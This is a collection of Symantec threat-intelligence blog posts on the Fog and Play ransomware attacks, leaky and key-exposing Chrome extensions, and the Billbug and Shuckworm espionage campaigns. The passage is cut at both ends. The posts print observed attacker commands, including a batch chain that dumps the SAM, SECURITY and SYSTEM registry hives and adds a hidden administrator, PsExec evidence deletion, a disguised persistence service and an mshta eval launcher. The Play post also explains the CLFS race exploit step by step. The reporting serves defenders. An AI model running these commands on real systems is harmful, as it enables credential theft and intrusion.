addition to this, Certutil was also used to download a file named agent.x64.exe (SHA256: 04f7326c40c33fda51010d067915a1e50b63e00b4ab86db00158d5e067a78ff6).

    "title": "fog ransomware attack",
    "link": "https://www.security.com/threat-intelligence/fog-ransomware-attack",
    "content": "A May 2025 attack on a financial institution in Asia saw the Fog ransomware deployed, alongside an unusual toolset, including some dual-use and open-source pentesting tools we have not observed being used in ransomware attacks previously. The attackers used a legitimate employee monitoring software called Syteca (formerly Ekran), which is highly unusual and not something we have seen used in a ransomware attack chain before. They also deployed several open-source pentesting tools – GC2, Adaptix, and Stowaway – which are not commonly used during ransomware attacks. Also notable in this attack was that, a few days after the ransomware was deployed, the attackers created a service to establish persistence. This is an unusual step to see in a ransomware attack, with malicious activity usually ceasing on a network once the attackers have exfiltrated data and deployed the ransomware, but the attackers in this incident appeared to wish to retain access to the victim’s network. The attackers were on the target’s network for about two weeks before they deployed the ransomware. TheFog ransomware was first documented in May 2024, and initially appeared to be primarily focused on targeting educational institutions in the U.S. In those early attacks, attackers using Fog gained initial access to networks by leveraging compromised VPN credentials. It was reported in October 2024 that attackers using Fogwere targeting a critical vulnerability (CVE-2024-40711 - CVSS 9.8) in the Veeam Backup & Replication (VBR) serversthat was patched in September 2024. Meanwhile, in April 2025, Fog attackers were reported to be using email as an initial infection vector in ransomware attacks in whichthe language used in the ransom notes appeared to be mocking Elon Musk’s Department of Government Efficiency (DOGE) in an effort to goad victims. Also notable in that attack campaign was that the ransom notes also offered a “decrypt for free” option if the victim chose to spread the ransomware to somebody else's computer. The initial infection vector used by the attackers in this recent incident isn't known. Two of the infected machines were Exchange Servers. While there was no evidence to suggest they were the initial infection vector, exploiting vulnerabilities in Exchange Servers is a common initial infection vector for ransomware actors. The first suspicious activity on the network was the installation of multiple open-source, post-exploitation penetration testing tools, including variants of the GC2 tool, which is an open-source tool that allows an attacker to execute commands on target machines using Google Sheets or Microsoft SharePoint List and exfiltrate files using Google Drive or Microsoft SharePoint documents. The GC2 implant polls the Google Sheet or SharePoint List for each operator command, then uses it to store its output, a log, and records the execution polling interval it is configured with. It is used by the attackers for various discovery commands. cmd /c \"ipconfig /all\" cmd /c \"netstat -anot|findstr 3389\" When communicating with the remote attacker, the GC2 tool also checks for the following commands: It contains two embedded configuration blobs in encoded form. This tool is not something we have seen used in ransomware attacks before, though it was used inan attack carried out by Chinese nation-state backed actor APT41in 2023. The open-source Stowaway proxy tool was used to deliver the Syteca (formerly Ekran) executable. It is not clear exactly what the Syteca tool was used for by the attackers. In the attack, the file is named 'sytecaclient.exe', but it also appears with the name 'update.exe.' Syteca islegitimate employee monitoring softwarethat can record onscreen activity and monitor keystrokes, among other capabilities. Several libraries are loaded by this executable, suggesting it was possibly used for information stealing or spying, which would be the most likely reason the attackers would deploy it given the keylogging and screen capture capabilities of the tool. CSIDL_SYSTEM\\regsvr32.exe\" /s /u [REDACTED] Files\\Ekran System\\Ekran System\\Client\\SoundCapture_7.20.576.0.dll\"\" CSIDL_SYSTEM\\regsvr32.exe\" /s /u [REDACTED] Files\\Ekran System\\Ekran System\\Client\\x86\\SoundCapture_7.20.576.0.dll\"\" CSIDL_SYSTEM\\regsvr32.exe\" /s /u [REDACTED] Files\\Ekran System\\Ekran System\\Client\\CredentialProviderWrapper.dll\"\" CSIDL_SYSTEM\\regsvr32.exe\" /s /u [REDACTED] Files\\Ekran System\\Ekran System\\Client\\CredentialProviderWrapper_7.20.576.0.dll\"\" Several commands that look like they are removing or killing the Syteca executable are also executed. This appears to be an attempt by the attackers to delete indicators and evidence of their activity on the network in an effort to avoid detection. CSIDL_SYSTEM\\taskkill.exe /f /im \"EkranClient.exe\" CSIDL_SYSTEM\\taskkill.exe /f /im \"EkranClientSession.exe\" CSIDL_SYSTEM\\taskkill.exe /f /im \"EkranController.exe\" CSIDL_SYSTEM\\taskkill.exe /f /im \"grpcwebproxy.exe\" CSIDL_SYSTEM\\taskkill.exe /f /im \"PamConnectionManager.exe\" CSIDL_SYSTEM_DRIVE\\program files\\ekran system\\ekran system\\tmp\\usbdriverinstaller.exe\" -u [REDACTED] CSIDL_SYSTEM_DRIVE\\program files\\ekran system\\ekran system\\tmp\\usbolddriveruninstaller.exe PsExec was also used to remove the Syteca client configuration file and binary in another attempt by the attackers to delete evidence of the presence of Syteca on the network: psexec64.exe -accepteula \\\\192.168.8.52 -u <?,?> -p <?,?> -h -s cmd /c \"del C:\\users\\public\\SytecaClient.ini\" psexec64.exe -accepteula \\\\192.168.8.150 -u <?,?> -p <?,?> -h -s cmd /c \"rm C:\\users\\public\\SytecaClient.exe\" PsExec and SMBExec were also used alongside Syteca and GC2 for lateral movement across the victim network. SMBExec was used to launch Syteca: cmd.exe /Q /c SytecaClient.exe 1> \\\\127.0.0.1\\ADMIN$\\__1748095766.8385904 2>&1 PsExec was used to laterally execute a suspected process watchdog/launcher for the GC2 backdoor: psexec64.exe -accepteual \\\\192.168.8.52 -u <?,?> -p <?,?> -h -s cmd /c \"CSIDL_COMMON_APPDATA\\microsoft\\devicesync\\windowsdevicesync.exe\" SMBExec and PsExec are both living off the land tools that are commonly used by ransomware attackers: For data theft, the attackers download multiple file transfer utilities - Freefilesync and MegaSync - as well as using 7-zip to archive sensitive directories. Other tools used on the target’s network include the Adaptix C2 Agent Beacon, which is a component of anopen-source extensible post-exploitation and adversarial emulation framework, Adaptix C2, designed for use by penetration testers. The variant used on the target’s network in this incident contained a configuration blob in encrypted form. Adaptix can be considered a sort of open-source alternative to the well-known Cobalt Strike framework. The Adaptix beacon agent is similar to Cobalt Strike beacon; once implanted on a victim machine, it calls back to the attacker and provides command and control (C&C) access. The attackers also used Process Watchdog, a program that continuously enumerates running processes to check for a specific process, in this case the GC2 process, which has the filenameAppxModels.exeand, if not found on a machine, Process Watchdog creates the process. C:\\ProgramData\\Microsoft\\Windows\\Models\\AppxModels.exe On the day the Fog ransomware was deployed, the Impacket SMB tool was also used, suggesting this may have been used to deploy the ransomware. Notably, several days after the ransomware was deployed, a service was run to establish persistence on the victim network. This is likely another process watchdog used to launch one of the attacker’s command and control tools, such as GC2.sc create SecurityHealthIron binPath= \"CSIDL_SYSTEM\\diagsvcs\\runtimebroker.exe\" start= auto DisplayName= \"Collect performance information about an application by using command-line tools.\" sc start SecurityHealthIron There are a few things that mark this ransomware attack out as unusual. The toolset deployed by the attackers is quite atypical for a ransomware attack. The Syteca client and GC2 tool are not tools we have seen deployed in ransomware attacks before, while the Stowaway proxy tool and Adaptix C2 Agent Beacon are also unusual tools to see being used in a ransomware attack. The attackers establishing persistence on a victim network having deployed the ransomware is also not something we would typically see in a ransomware attack. These factors mean it could be possible that this company may in fact have been targeted for espionage purposes, with the ransomware attack merely a decoy, or perhaps also deployed in an attempt by the attackers to make some money while also carrying out their espionage activity. What we can say with certainty is that this was an unusual toolset to see in a ransomware attack and is worth noting for businesses and corporations wanting to guard against attacks by malicious actors.

    "title": "chrome extension leaks",
    "link": "https://www.security.com/threat-intelligence/chrome-extension-leaks",
    "content": "Many users assume that popular Chrome extensions adhere to strong security practices, especially when the extensions themselves promise functionality related to privacy, ranking analytics, or convenient new tab features. However, recent findings show that several widely used extensions—SEMRush Rank, PI Rank, MSN New Tab/Homepage, DualSafe Password Manager,andBrowsec VPN—unintentionally transmit sensitive data over simple HTTP. By doing so, they expose browsing domains, machine IDs, operating system details, usage analytics, and even uninstall information, in plaintext. Because the traffic is unencrypted, a Man-in-the-Middle (MITM) attacker on the same network can intercept and, in some cases, even modify this data, leading to far more dangerous scenarios than simple eavesdropping. This blog illustrates the exact points where these leaks occur, why they are problematic, and how the resulting disclosures can be exploited for profiling, data correlation, or targeted attacks. Two extensions, SEMRush Rank (ID: idbhoeaiokcojcgappfigpifhpkjgmab) with over 30,000 users, and PI Rank (ID: ccgdboldgdlngcgfdolahmiilojmfndl), exhibit identical patterns in their code. Both rely on a service URL of the form shown in Figure 1. The variable “url” corresponds to the user’s currently visited domain. The extensions thus call rank.trellian.com over plain HTTP, appending the entire domain name in the query string. Because HTTP provides no encryption, anyone with the ability to sniff network traffic can read that domain name. On a public Wi-Fi or compromised network, this means user browsing activity is visible to attackers. It is particularly concerning that these extensions are intended to display website rank, which suggests users might frequently engage them, causing repeated unencrypted calls that reveal domains the user is visiting. Browsec VPN (ID: omghfjlpggmjjaagoclmmobgdodcjboh) claims to have more than 6 million users. While it promises a secure and private web experience, its uninstall flow and manifest file illustrate a different story. The extension sets an uninstall URL in the background code. Notice theuninstallURLis chosen based on whether the build is “qa” or not, defaulting to anHTTPendpoint at browsec-uninstall.s3-website.eu-central-1.amazonaws.com. The code then gathers usage statistics (like countryChanges, iconClicks, and others), along with a unique user ID (userId), and appends them as query parameters. Finally, it calls chrome.runtime.setUninstallURL to ensure this plaintext link is opened when the user uninstalls Browsec. Even more revealing is the Browsec VPN manifest, which allows connect-src to a long list of HTTP domains such as http://trafcfy.com and many similar endpoints. This wide array of unsecured hosts suggests the extension is permitted to initiate plain HTTP connections to multiple third-party servers, undermining the expectation that a VPN-focused tool would always encrypt traffic. Because any unencrypted call is susceptible to interception or manipulation, a MITM attacker could hijack these Browsec VPN requests or responses, further jeopardizing user privacy. MSN New Tab (ID: lklfbkdigihjaaeamncibechhgalldgl) with about 500,000 users, and MSN Homepage, Bing Search & News (ID: midiombanaceofjhodpdibeppmnamfcj) with 10,000 users, rely on a function named SendPingDetails. That function, shown in Figure 4, transmits a MachineID and other details over HTTP. This code constructs a URL beginning with and appends parameters for the operating system (OS), the extension’s version (LV), and a unique machine identifier (MI). The MachineID is created by another function, guid, which generates a stable value to represent the user’s device. Because everything is sent in the clear (for example MI=someUniqueId123), it is easy to see how a passive listener on the network can collect that ID. Over time, repeated calls to the same ID can link multiple browsing sessions or physical locations, leading to sophisticated user profiling. The large user base of MSN New Tab in particular raises further concerns, since half a million or more users may be leaking OS details and stable machine IDs with each ping. DualSafe Password Manager & Digital Vault (ID: lgbjhdkjmpgjgcbcdlhkokkckpjmedgc), with around 300,000 users, is another example of an extension sending unencrypted analytics. In the snippet shown in Figure 5, the statistics.getURL method constructs an HTTP-based request. This function eventually causes the extension to make a call to stats.itopupdate.com over plain HTTP. The data includes the extension version, user’s browser language, and usage “type,” among other metrics. Although credentials or passwords do not appear to be leaked, the fact that a password manager uses unencrypted requests for telemetry erodes trust in its overall security posture. Network eavesdroppers or malicious access points can examine these calls to see how the extension is being used and possibly track the user’s environment. DualSafe has since addressed the problem in its latest release, switching the telemetry endpoint to HTTPS and encrypting all transmitted data. All of the previously mentioned extensions make HTTP requests that expose user data in plaintext. While none of them appear to leak direct passwords, the variety of information that does leak includes browsing domains, unique machine IDs, OS details, usage metrics, and even final uninstall parameters. Unencrypted traffic is trivially accessible to anyone performing a Man-in-the-Middle attack, allowing them not only to collect but also to potentially manipulate this data in flight. That data can be combined or correlated by any party who can intercept the connection, including malicious hotspots, internet service providers, and other eavesdroppers. Users of these extensions should consider removing them until the developers address the insecure calls. The risk is not just theoretical; unencrypted traffic is simple to capture, and the data can be used for profiling, phishing, or other targeted attacks. Developers, for their part, should switch to HTTPS whenever they send or receive data, especially if the purpose of their extension is to protect user privacy or provide security-related features. The overarching lesson is that a large install base or a well-known brand does not necessarily ensure best practices around encryption. Extensions should be scrutinized for the protocols they use and the data they share, to ensure users’ information remains truly safe. All of the developers whose extensions were discussed in this blog have been notified about the issues we uncovered. For the latest protection updates, please visit theSymantec Protection Bulletin.

    "content": "Hardcoded credentials—API keys, secrets, or tokens located directly in a browser extension’s JavaScript—rank among the most significant security oversights in modern development. Once published, these secrets are exposed to anyone who cares to look; an attacker needs only inspect the extension package to extract them. From there, the attacker can craft malicious requests—ranging from spamming analytics with bogus events to commandeering paid cloud services, incurring fees, and undermining user privacy. In this blog, we will examine individual examples drawn from popular Chrome extensions, noting the specific code snippets that reveal each secret and explaining the associated risks. TheAvast Online Security & Privacyextension (7,000,000+ users) andAVG Online Security(600,000+ users) share similar code, each containing a hardcoded Google Analytics 4 (GA4) API secret (Figure 1). Because the secret (GA4_API_SECRET) is appended to the URL, any attacker who discovers it could bombard the GA4 endpoint with spurious events, corrupting metrics or inflating analytics costs.AVG Online Securityreveals a virtually identical pattern in its code. Both extensions demonstrate how embedding a private key in the client code can lead to large-scale data pollution or unauthorized access to analytics resources. With over 5,000,000 users,Equatio – Math Made Digitalembeds an Azure API key used for speech recognition, as seen in Figure 2. Because the key resides in window.equatioAzureApiKey, anyone inspecting or debugging the extension can clearly see it. The code snippet shown in Figure 2 shows thatEquatiocalls fromSubscription(...) with the key to initialize Microsoft Azure’s speech-to-text service. If a malicious user replays or spams these calls, the developer’s Azure subscription could see inflated costs or usage exhaustion. BothAwesome Screen Recorder & Screenshot(3,000,000+ users) andScrolling Screenshot Tool & Screen Capture(400,000+ users) use virtually the same snippet for AWS S3 uploads, exposing the developer’s AWS access key (Figure 3). In both extensions, the embedded key is used to upload screenshots or images to the developer’s S3 bucket. Because the credentials appear in plain text, an attacker could script uploads to the same bucket—potentially hosting illegal content, pushing malicious files, or even pivoting to other AWS resources if the credentials have broader permissions. Essentially, a few lines of JavaScript here undermine the entire AWS environment’s security posture. Microsoft Editor(2,000,000+ users) reveals a telemetry key called StatsApiKey. In the code shown in Figure 4, the extension uses that key to log user data for analytics. Anyone with this key can generate spoofed telemetry data, polluting Microsoft’s analytics and potentially sabotaging any usage insights the developer relies upon. Worse, if the logging system imposes cost or rate limits, mass abuse can drain resources or lock the developer out of their own analytics suite. A significant security risk has been uncovered in over 90 Chrome extensions that use the third-party libraryInboxSDK, which contains hardcoded credentials. These credentials, including API keys, are often exposed directly in the source code, leaving the extensions vulnerable to exploitation. For instance, the popular extensionAntidote Connector, with over 1,000,000 users, includes this third-party library for certain Gmail requests. In the example shown in Figure 5, we see how this API key is inserted directly into the header for communication with Google services. The problem stems from the fact that these hardcoded credentials are accessible to anyone who inspects the extension's code. In the case of InboxSDK, the Google API key is attached to each request using 'x-goog-api-key': googleApiKey. This makes it easy for an attacker to replicate the request headers, potentially allowing them to access or manipulate Gmail data, or even spam Google’s endpoints until the developer’s usage quota is exhausted or blacklisted. Given that this vulnerability exists in over 90 extensions using InboxSDK, the issue poses a wide-reaching threat that extends beyond just a single extension. Antidote Connector has since resolved the flaw in its latest version, removing the hard-coded key and adopting a more secure authentication flow. Watch2Gether(1,000,000+ users) leaks a Tenor GIF search API key (Figure 6). Although Tenor is “just GIFs,” usage can still cost money or trigger rate limits if spammed at scale. Moreover, spamming large volumes of search requests could cause the developer’s account to get banned from the Tenor API. This example shows that even a seemingly benign, entertainment-related key can lead to real consequences. Watch2Gether has since patched the problem in their latest release, eliminating the exposed key and moving authentication to a more secure flow. InTrust Wallet(1,000,000+ users), the code reveals a fiat ramps API key (Figure 7). This key is concatenated into a string used to produce a signature for crypto purchase quotes. If an attacker duplicates the extension’s logic, they could generate authentic-looking requests to buy or sell cryptocurrency on behalf of unsuspecting users, or intercept real transactions to manipulate the quotes. This scenario is especially concerning because it touches on financial data and transactions. Rounding out these examples,TravelArrow(300,000+ users) exposes a geolocation API key (Figure 8). Using this key, the extension makes location queries to ip-api.com. If attackers replicate the calls or send them in large volumes, they could drive up usage, potentially leaving theTravelArrowdeveloper with hefty bills or disabled API access. Even an API used primarily for location can be abused when key-based metering or quotas are in play. From GA4 analytics secrets to Azure speech keys, and from AWS S3 credentials to Google-specific tokens, each of these snippets demonstrates how a few lines of code can jeopardize an entire service. The solution: never store sensitive credentials on the client side. Instead, route privileged operations through a secure backend server, where secrets remain protected behind environment variables or secret management systems. Regular key rotation, usage monitoring, and the principle of least privilege will further minimize risk. By removing exposed secrets from their extensions, developers keep user trust intact, avoid financial losses, and ensure more reliable analytics for their products.

    "title": "play ransomware zero day",
    "link": "https://www.security.com/threat-intelligence/play-ransomware-zero-day",
    "content": "Attackers linked to the Play ransomware operation deployed a zero-day privilege escalation exploit during an attempted attack against an organization in the U.S. The attack occurred prior to the disclosure and patching of a Windows elevation of privilege zero-day vulnerability (CVE-2025-29824) in the Common Log File System Driver (clfs.sys) on April 8, 2025. Although no ransomware payload was deployed in the intrusion, the attackers deployed theGrixba infostealer, which is a custom tool associated with Balloonfly, the attackers behind the Play ransomware operation. Balloonfly is a cybercrime group that has been active since at least June 2022 and uses the Play ransomware (also known as PlayCrypt) in attacks. The group has impacted a wide range of businesses and critical infrastructure in North America, South America, and Europe. The initial infection vector may have been a public facing Cisco ASA firewall. The attackers moved by unknown means to another, Windows machine on the targeted network.During the attack, the Balloonfly operators deployed a variety of samples and hacktools in addition to the Grixba infostealer and the exploit for CVE-2025-29824 on this machine. Some of the samples aren’t available to us at the moment of writing, but they were located in the Music folder with suspicious names masquerading as Palo Alto software (paloaltoconfig.exe, paloaltoconfig.dll) or, for example, 1day.exe. To gather information on all the available machines in the victims’ Active Directory, the attackers executed the following command and saved the output to C:\\Users\\[REDACTED]\\Music\\AllWindows.csv file. powershell Import-Module ActiveDirectory; Get-ADComputer -Filter {enabled -eq $true} -properties *|select comment, description, Name, DNSHostName, OperatingSystem, LastLogonDate, ipv4address | Export-CSV C:\\Users\\[REDACTED]\\Music\\AllWindows.csv -NoTypeInformation -Encoding UTF8 The attackers elevated privileges by exploiting a vulnerability in the Common Log File System (CLFS) kernel driver. In order to interact with the driver, the exploit calls the CreateFileW() API, passing the string \"\\\\.\\LOG:\\??\\C:\\ProgramData\\SkyPDF\\PDUDrv\" as the lpFileName parameter. During that API call, the Windows kernel allocates a new FILE_OBJECT structure to represent that particular instance of a file open operation and then sends a request to the CLFS driver as identified by the \"\\\\.\\LOG:\" filename prefix. The request is represented as an I/O Request Packet (IRP) with the major function code IRP_MJ_CREATE and instructs the driver to perform the actual open operation. Acting on this request, the driver allocates additional structures, including an undocumented structure, CClfsLogCcb. A pointer to the created CClfsLogCcb structure is stored in the FsContext2 field of the FILE_OBJECT structure, suggesting that the CClfsLogCcb structure could be a Context Control Block associated with that file open operation. Finally, the Windows kernel allocates a new file handle that refers to the created FILE_OBJECT structure. The exploit then attempts to perform two I/O operations around the same time on that file handle by calling different APIs from two threads. From the first thread, the exploit calls the CloseHandle() API. During that API call, the Windows kernel closes the only file handle associated with the FILE_OBJECT structure previously discussed. To notify the driver that all outstanding file handles for the FILE_OBJECT structure have been closed, the Windows kernel sends an I/O Request Packet (IRP) with the major function code IRP_MJ_CLEANUP to the CLFS driver. When handling this request, the vulnerable versions of the driver deallocate the structure CClfsLogCcb. From the second thread, the exploit calls the DeviceIoControl() API. The internal operations performed by the Windows kernel during that API call are determined by the sequence of operations across the two threads. In a particular scenario, the Windows kernel completes a lookup for the FILE_OBJECT structure referred to by the file handle during the DeviceIoControl() API call before the other thread closes the handle. The Windows kernel then sends an I/O Request Packet (IRP) with the major function code IRP_MJ_DEVICE_CONTROL to the CLFS driver that instructs the driver to perform the actual operation. That specific operation was picked when developing the exploit and involves the structure CClfsLogCcb. However, the Windows kernel does not guarantee the relative ordering of the IRP_MJ_CLEANUP request from the first thread and the IRP_MJ_DEVICE_CONTROL request from the second thread. For example, the IRP_MJ_CLEANUP request may complete first, deallocating the structure CClfsLogCcb, before the IRP_MJ_DEVICE_CONTROL request is sent do the driver. And then, when handling the IRP_MJ_DEVICE_CONTROL request, the CLFS driver uses the memory pointer from the FsContext2 field of the FILE_OBJECT structure, which still refers to the location of the already deallocated structure CClfsLogCcb, to operate on unexpected data. This is abused by the exploit to modify the kernel memory. During the execution of the exploit, two files are created in the path C:\\ProgramData\\SkyPDF. The first file, PDUDrv.blf, is a Common Log File System base log file and is an artifact created during exploitation. The second file, clssrv.inf, is a DLL that is injected into the winlogon.exe process. This DLL has the ability to drop two additional batch files. The first batch file, called servtask.bat, is stored in the “C:\\ProgramData” folder. This file is used to elevate privileges and dump the SAM, SYSTEM, and SECURITY Registry hives and to create a new user named LocalSvc and add it to the Administrator group. mkdir C:\\\\ProgramData\\\\Events & echo Yes | reg save hklm\\\\sam C:\\\\ProgramData\\\\Events\\\\Errors.evt & echo Yes | reg save hklm\\\\security C:\\\\ProgramData\\\\Events\\\\Logs.evt & echo Yes | reg save hklm\\\\system C:\\\\ProgramData\\\\Events\\\\Jobs.evt & net user /add LocalSvc Dc_34%gfE62cvsa & powershell.exe \\\"Add-LocalGroupMember -SID \\\"S-1-5-32-544\\\" -Member \\\"LocalSvc\\\"\\\" & net localgroup Administrators LocalSvc /add & reg add HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f & reg add \\\"HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\\SpecialAccounts\\\\UserList\\\" /v LocalSvc\" /d 0 /t REG_DWORD & icacls C:\\\\ProgramData\\\\Events /grant Everyone:F /inheritance:e /T & call C:\\\\ProgramData\\\\cmdpostfix.bat & del C:\\\\ProgramData\\\\Events\\\\Errors.evt & del C:\\\\ProgramData\\\\Events\\\\Logs.evt & del C:\\\\ProgramData\\\\Events\\\\Jobs.evt & del C:\\\\ProgramData\\\\Events\\\\Tasks.evt & del C:\\\\ProgramData\\\\Events\\\\Tmp.evt & del C:\\\\ProgramData\\\\Events\\\\out.zip & schtasks /Create /F /xml C:\\\\ProgramData\\\\CacheTask.xml /TN \\\\Microsoft\\\\Windows\\\\Wininet\\\\CacheTask & rmdir C:\\\\ProgramData\\\\Events & del C:\\\\ProgramData\\\\CacheTask.xml & del C:\\\\ProgramData\\\\cmdpostfix.bat & del C:\\\\ProgramData\\\\servtask.bat The second batch file, named cmdpostfix.bat, is also created in the “C:\\ProgramData” folder and is used to clean up the artifacts created by the exploit: del C:\\\\ProgramData\\\\SkyPDF\\\\PDUDrv.blf & del C:\\\\ProgramData\\\\SkyPDF\\\\ClsSrv.inf & rmdir C:\\\\ProgramData\\\\SkyPDF Ultimately, the exploit executes the aforementioned batch files via the following commands: The exploit (or similar exploits) may have been in the hands of multiple actors prior to the patching of CVE-2025-29824. When patching the vulnerability, Microsoft said that it had beenexploited against a “small number of targets,” including organizations in the U.S., Venezuela, Spain, and Saudi Arabia. Microsoft said that the exploit had been deployed by the PipeMagic malware, which is often used by a group called Storm-2460 to deploy ransomware. The nature of the exploitation by Storm-2460 appears different from the Balloonfly-linked activity discovered by Symantec. Microsoft said that the exploit had been launched in memory from a dllhost.exe process. The exploitation discovered by Symantec was not fileless. While the use of zero-day vulnerabilities by ransomware actors is rare, it is not unprecedented.Last year Symantec found evidencethat attackers linked to the Black Basta ransomware may have been exploiting a recently patched Windows privilege escalation vulnerability (CVE-2024-26169) as a zero-day. That vulnerability was patched on March 12, 2024, and, at the time, Microsoft said there was no evidence of its exploitation in the wild. However, analysis of an exploit tool revealed evidence that it could have been compiled prior to patching, meaning at least one group may have been exploiting the vulnerability as a zero-day.

    "link": "https://www.security.com/threat-intelligence/billbug-china-espionage",
    "content": "The Billbug espionage group (aka Lotus Blossom, Lotus Panda, Bronze Elgin) compromised multiple organizations in a single Southeast Asian country during an intrusion campaign that ran between August 2024 and February 2025. Targets included a government ministry, an air traffic control organization, a telecoms operator, and a construction company. In addition to this, the group staged an intrusion against a news agency located in another country in Southeast Asia and an air freight organization located in another neighboring country. The attacks involved the use of multiple new custom tools, including loaders, credential stealers, and a reverse SSH tool. The campaign is one of the findings documented in the Threat Hunter Team’s new whitepaper -Relentless Force: China-linked Espionage Actors The activity appears to be acontinuation of a campaign first documented by Symantec in December 2024, where multiple high-profile organizations in Southeast Asian countries were targeted. While it was clear that Chinese actors were behind the attacks, attribution to a single actor could not be determined. However,a recent blog by Cisco Talosdetailing recent Billbug activity contained indicators of compromise (IOCs) used in this campaign, indicating that it was the work of Billbug. In several of the intrusions, the attackers used legitimate software from Trend Micro and Bitdefender to load malicious loaders, using the technique known as DLL sideloading. One of the legitimate executables used for sideloading was a Trend Micro binary named tmdbglog.exe (SHA246: f9036b967aaadf51fe0a7017c87086c7839be73efabb234e2c21885a6840343e). This was used to sideload a malicious DLL named tmdglog.dll (SHA256: b75a161caab0a90ef5ce57b889534b5809af3ce2f566af79da9184eaa41135bd). Analysis of tmdglog.dll revealed that it was a loader that read, decrypted, and executed the contents of the file C:\\Windows\\temp\\TmDebug.log. It then logged the execution progress to C:\\Windows\\Temp\\VT001.tmp. Another legitimate executable used was a Bitdefender binary named bds.exe (SHA256: 2da00de67720f5f13b17e9d985fe70f10f153da60c9ab1086fe58f069a156924). This was used to sideload a malicious DLL named log.dll (SHA256: 54f0eaf2c0a3f79c5f95ef5d0c4c9ff30a727ccd08575e97cce278577d106f6b). Analysis of log.dll concluded that it was another loader which read and decrypted the contents of the file winnt.config. It then started the process C:\\Windows\\system32\\systray.exe and injected the decrypted contents to it. Several variants of log.dll were used in the campaign, but only one was retrieved for analysis. The same Bitdefender binary was also used to sideload a file named sqlresourceloader.dll, which was also not retrieved. It is unknown if this is related to the loader analyzed or a different tool. The attackers also used a new variant of the Sagerunex backdoor, a custom tool that is exclusively used by Billbug. The variant (SHA256: 4b430e9e43611aa67263f03fd42207c8ad06267d9b971db876b6e62c19a0805e) appears to be related to variants of Sagerunex documented by Cisco in February 2025. As documented by Cisco, the attackers created a persistence mechanism by modifying the registry to ensure that it would run as a service. Among the new tools deployed were two designed to steal credentials from the Chrome web browser. Deployed tools included: The attackers deployedthe publicly available Zrokpeer-to-peer tool, using thesharing function of the toolin order to provide remote access to services that were exposed internally. Another legitimate tool used was called datechanger.exe (SHA256: b337a3b55e9f6d72e22fe55aba4105805bb0cf121087a3f6c79850705593d904). It is capable of changing timestamps for files, presumably to muddy the waters for incident analysts. Active since at least 2009, Billbug has largely focused on Southeast Asia, targeting governments and military organizations in particular. The group first came to public attention in 2015 whenPalo Alto published a reporton its activities in Southeast Asia, linking it to over 50 different attacks over a period of three years. Its campaigns used spear-phishing emails and convincing lure documents to deliver the custom Trensil (aka Elise) Trojan. In 2018, Symantecpublished an investigation on the group’s activity, detailing an attack on a large telecoms operator in Southeast Asia. The attackers used PsExec to install a previously unknown piece of malware (Infostealer.Catchamas). The discovery of this attack led to the discovery of further attacks against the communications, geospatial imaging, and defense sectors, both in the U.S. and Southeast Asia. During that investigation, Symantec referred to the actor as Thrip, but we subsequently determined that Thrip and Billbug were most likely the same group and began tracking all activity under the Billbug name. In 2019,Symantec published another report on the group, detailing the use of two previously unseen backdoors known as Hannotog (Backdoor.Hannotog) and Sagerunex (Backdoor.Sagerunex). Targets of this campaign included at least 12 organizations in Hong Kong, Macau, Indonesia, Malaysia, the Philippines, and Vietnam. In addition to military targets, the group also attacked organizations in the maritime communications, media, and education sectors. Billbug remained active in subsequent years. In November 2022,Symantec published new research on the group, highlighting an attack on a digital certificate authority in an Asian country. The targeting of a certificate authority was notable because the attackers could have accessed certificates and used them to sign malware, helping them to evade detection. Compromised certificates could also potentially be used to intercept HTTPS traffic.

    "content": "Shuckworm’s relentless focus on Ukraine has continued into 2025, with the group targeting the military mission of a Western country based in the Eastern European nation. This first activity in this campaign occurred in February 2025, and it continued into March. The initial infection vector used by the attackers appears to have been an infected removable drive. In this campaign, the attackers appear to be using an updated version of their GammaSteel tool. GammaSteel is an infostealer that exfiltrates data from victim networks. The attackers are seen using various methods for data exfiltration, including using thewrite.asweb service for possible exfiltration. They are also seen using cURL alongside Tor as a backup method of data exfiltration. cURL is anopen-source command-line toolthat can be used to transfer data to and from a server and is frequently leveraged by malicious actors. This campaign also seems to demonstrate a move by Shuckworm from using a lot of VBS scripts to using more PowerShell-based tools, particularly later in its attack chain. It is likely leveraging PowerShell for obfuscation and also because it allows it to store scripts in the registry. GammaSteel was deployed following a complex, multi-staged attack chain, with frequent use of obfuscation. The process was most likely designed to minimize the risk of detection. Shuckworm (aka Gamaredon, Armageddon) is a Russia-linked espionage group that has almost exclusively focused its operations on government, law enforcement, and defense organizations in Ukraine since it first appeared in 2013. It is believed that Shuckwormoperates on behalf of the Russian Federal Security Service (FSB). The initial infection in this campaign appeared to occur on February 26 with the creation of a Windows Registry value under theUserAssistkey that indicates the infection may have started from an external drive and an LNK file namedD:\\files.lnk. The UserAssist registry key stores the applications, files, links, and other objects accessed by the user through Windows Explorer stored in a ROT13 format. HKU\\[REDACTED]\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{F4E57C4B-2036-45F0-A9AB-443BCFE33D9F}\\Count\\Q:\\svyrf.yax After that event, explorer.exe launched a mshta.exe process executing the following command: \"C:\\Windows\\System32\\mshta.exe\" javascript:eval('w=new%20ActiveXObject(\"WScript.Shell\");w.run(\"explorer files\");w.run(\"wscript.exe //e:vbScript \\~.drv\");window.close()') Then, the following commands were executed: \"C:\\Windows\\System32\\wscript.exe\" //e:vbScript ~.drv \"C:\\Windows\\System32\\wscript.exe\" \"\"C:\\Users\\Public\\NTUSER.DAT.TMContainer00000000000000000001.regtrans-ms\"\" //e:vbscript //b /numerousIOC \"C:\\Windows\\System32\\wscript.exe\" \"\"C:\\Users\\Public\\NTUSER.DAT.TMContainer00000000000000000002.regtrans-ms\"\" //e:vbscript //b /numerousIOC \"C:\\Windows\\SysWOW64\\mshta.exe\" \"C:\\Users\\[REDACTED]\\AppData\\Local\\Temp\\keepoAI.hta\" The ~.drv file is highly obfuscated, but it seems to be used to create two files and execute them: C:\\Users\\Public\\NTUSER.DAT.TMContainer00000000000000000001.regtrans-ms c:\\users\\public\\ntuser.dat.tmcontainer00000000000000000002.regtrans-ms The first file (NTUSER.DAT.TMContainer00000000000000000001.regtrans-ms) is used to contact the command and control (C&C) server and stay in constant contact with it. First, it searches for a ping record with a WMI query: \"Select * From Win32_PingStatus where Address = 'mil.gov.ua'\" to the address \"mil.gov.ua\", If there is no ping record or the ping is not successful, it will finish 